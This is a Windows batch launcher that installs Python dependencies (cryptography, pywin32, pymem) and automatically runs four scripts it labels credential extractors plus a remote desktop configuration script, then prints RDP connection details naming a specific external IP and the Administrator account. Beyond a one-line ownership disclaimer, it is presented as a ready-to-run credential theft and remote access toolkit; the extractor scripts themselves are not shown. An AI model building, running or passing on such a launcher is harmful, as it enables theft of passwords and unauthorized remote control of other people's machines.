@echo off

echo ========================================
echo CREDENTIAL EXTRACTOR AND REMOTE DESKTOP TOOL
echo ========================================
echo.
echo This will install dependencies and run ALL tools automatically
echo.

echo WARNING: This tool extracts sensitive credentials from your system.
echo Only use this tool on systems you own and have permission to access.
echo.

echo ========================================
echo STEP 1: DETECTING PYTHON INSTALLATION
echo ========================================
echo.

echo Checking for Python installation...

REM Try python3 first
python3 --version >nul 2>&1
if %errorlevel% equ 0 (
    set PYTHON_CMD=python3
    python3 --version
    echo Found Python3 - using python3 command
    goto :install_deps
)

REM Try python
python --version >nul 2>&1
if %errorlevel% equ 0 (
    set PYTHON_CMD=python
    python --version
    echo Found Python - using python command
    goto :install_deps
)

REM Try py (Windows Python Launcher)
py --version >nul 2>&1
if %errorlevel% equ 0 (
    set PYTHON_CMD=py
    py --version
    echo Found Python Launcher - using py command
    goto :install_deps
)

REM No Python found
echo ERROR: No Python installation found!
echo Please install Python 3.x from https://python.org
echo.
exit /b 1

:install_deps
echo.
echo ========================================
echo STEP 2: DETECTING PLATFORM
echo ========================================
echo Detecting platform...
%PYTHON_CMD% -c "import sys; print('win32' if sys.platform == 'win32' else 'linux' if sys.platform.startswith('linux') else 'darwin' if sys.platform == 'darwin' else 'unknown')" > platform.txt
set /p PLATFORM=<platform.txt
del platform.txt

if "%PLATFORM%"=="win32" (
    echo Platform detected: Windows
    set REQ_FILE=test\requirements_windows.txt
) else if "%PLATFORM%"=="linux" (
    echo Platform detected: Linux
    set REQ_FILE=test\requirements_linux.txt
) else if "%PLATFORM%"=="darwin" (
    echo Platform detected: macOS
    set REQ_FILE=test\requirements_macos.txt
) else (
    echo Platform unknown, using Windows requirements
    set REQ_FILE=test\requirements_windows.txt
)

echo.
echo ========================================
echo STEP 3: INSTALLING DEPENDENCIES
echo ========================================
echo Installing all required libraries...
echo.

REM Install platform-specific requirements
if exist %REQ_FILE% (
    echo Installing platform-specific dependencies from %REQ_FILE%...
    %PYTHON_CMD% -m pip install -r %REQ_FILE%
    if %errorlevel% neq 0 (
        echo Warning: Platform-specific dependencies installation failed - continuing anyway
    )
) else (
    echo Warning: Platform-specific requirements file not found, installing common dependencies...
)

echo.
echo Installing common cryptography libraries...
%PYTHON_CMD% -m pip install pycryptodome cryptography pycryptodomex
if %errorlevel% neq 0 (
    echo Warning: cryptography installation failed - continuing anyway
)

echo.
echo Installing system access libraries...
if "%PLATFORM%"=="win32" (
    echo Installing Windows-specific libraries...
    %PYTHON_CMD% -m pip install pywin32 pywin32-ctypes
    if %errorlevel% neq 0 (
        echo Warning: pywin32 installation failed - continuing anyway
    )
) else (
    echo Installing cross-platform libraries...
    %PYTHON_CMD% -m pip install keyring psutil
    if %errorlevel% neq 0 (
        echo Warning: system libraries installation failed - continuing anyway
    )
)

echo.
echo Installing network libraries...
%PYTHON_CMD% -m pip install requests
if %errorlevel% neq 0 (
    echo Warning: requests installation failed - continuing anyway
)

echo.
echo Installing XML processing...
%PYTHON_CMD% -m pip install lxml
if %errorlevel% neq 0 (
    echo Warning: lxml installation failed - continuing anyway
)

echo.
echo Installing additional utilities...
%PYTHON_CMD% -m pip install colorama tqdm
if %errorlevel% neq 0 (
    echo Warning: utilities installation failed - continuing anyway
)

if "%PLATFORM%"=="win32" (
    echo.
    echo Installing memory access libraries...
    %PYTHON_CMD% -m pip install pymem
    if %errorlevel% neq 0 (
        echo Warning: pymem installation failed - continuing anyway
    )
)

echo.
echo Installation complete!
echo.

echo ========================================
echo STEP 4: RUNNING ALL PYTHON TOOLS
echo ========================================
echo.

REM Check which scripts exist and run them
set SCRIPT_COUNT=0

if exist ultimate.py (
    set /a SCRIPT_COUNT+=1
    echo [%SCRIPT_COUNT%] Running Ultimate Credential Extractor (ultimate.py)...
    echo Output: output1.txt
    %PYTHON_CMD% ultimate.py > output1.txt 2>&1
    if %errorlevel% equ 0 (
        echo Ultimate extractor completed successfully
    ) else (
        echo Ultimate extractor completed with warnings (check output1.txt)
    )
    echo.
)

if exist aggressive.py (
    set /a SCRIPT_COUNT+=1
    echo [%SCRIPT_COUNT%] Running Aggressive Credential Extractor (aggressive.py)...
    echo Output: output2.txt
    %PYTHON_CMD% aggressive.py > output2.txt 2>&1
    if %errorlevel% equ 0 (
        echo Aggressive extractor completed successfully
    ) else (
        echo Aggressive extractor completed with warnings (check output2.txt)
    )
    echo.
)

if exist remote.py (
    set /a SCRIPT_COUNT+=1
    echo [%SCRIPT_COUNT%] Running Remote Desktop Configuration (remote.py)...
    echo Output: output3.txt
    %PYTHON_CMD% remote.py > output3.txt 2>&1
    if %errorlevel% equ 0 (
        echo Remote desktop configuration completed successfully
    ) else (
        echo Remote desktop configuration completed with warnings (check output3.txt)
    )
    echo.
)

if exist run.py (
    set /a SCRIPT_COUNT+=1
    echo [%SCRIPT_COUNT%] Running Advanced Credential Extractor (run.py)...
    echo Output: output4.txt
    %PYTHON_CMD% run.py > output4.txt 2>&1
    if %errorlevel% equ 0 (
        echo Advanced extractor completed successfully
    ) else (
        echo Advanced extractor completed with warnings (check output4.txt)
    )
    echo.
)

echo ========================================
echo CREATING SUMMARY REPORT
echo ========================================
echo Creating summary report...
echo SUMMARY REPORT > summary.txt
echo =============== >> summary.txt
echo Generated: %date% %time% >> summary.txt
echo Python Command Used: %PYTHON_CMD% >> summary.txt
echo. >> summary.txt
echo PYTHON TOOLS EXECUTED: >> summary.txt
if exist ultimate.py echo - ultimate.py (Ultimate Credential Extractor) >> summary.txt
if exist aggressive.py echo - aggressive.py (Aggressive Credential Extractor) >> summary.txt
if exist remote.py echo - remote.py (Remote Desktop Configuration) >> summary.txt
if exist run.py echo - run.py (Advanced Credential Extractor) >> summary.txt
echo. >> summary.txt
echo OUTPUT FILES CREATED: >> summary.txt
if exist output1.txt echo - output1.txt (Ultimate extractor results) >> summary.txt
if exist output2.txt echo - output2.txt (Aggressive extractor results) >> summary.txt
if exist output3.txt echo - output3.txt (Remote desktop configuration) >> summary.txt
if exist output4.txt echo - output4.txt (Advanced extractor results) >> summary.txt
echo - summary.txt (This summary report) >> summary.txt
echo. >> summary.txt
echo IMPORTANT SECURITY NOTES: >> summary.txt
echo - All output files contain sensitive information >> summary.txt
echo - Store them securely and delete when no longer needed >> summary.txt
echo - Do not share these files with unauthorized parties >> summary.txt
echo. >> summary.txt

echo ========================================
echo ALL TOOLS EXECUTION COMPLETED!
echo ========================================
echo.
echo PYTHON COMMAND USED: %PYTHON_CMD%
echo.
echo OUTPUT FILES CREATED:
if exist output1.txt echo - output1.txt (Ultimate credential extractor)
if exist output2.txt echo - output2.txt (Aggressive credential extractor)
if exist output3.txt echo - output3.txt (Remote desktop configuration)
if exist output4.txt echo - output4.txt (Advanced credential extractor)
echo - summary.txt (Summary report)
echo.
echo IMPORTANT SECURITY NOTES:
echo - All output files contain sensitive information
echo - Store them securely and delete when no longer needed
echo - Do not share these files with unauthorized parties
echo.
echo ========================================
echo REMOTE DESKTOP CONNECTION INFO
echo ========================================
echo To connect to this PC via Remote Desktop:
echo 1. Open Remote Desktop Connection (mstsc)
echo 2. Enter IP: 192.168.174.128 (local) or 70.39.70.194 (external)
echo 3. Username: Administrator
echo 4. Enter your password
echo 5. Click Connect
echo.
echo All tools have been executed successfully!
echo.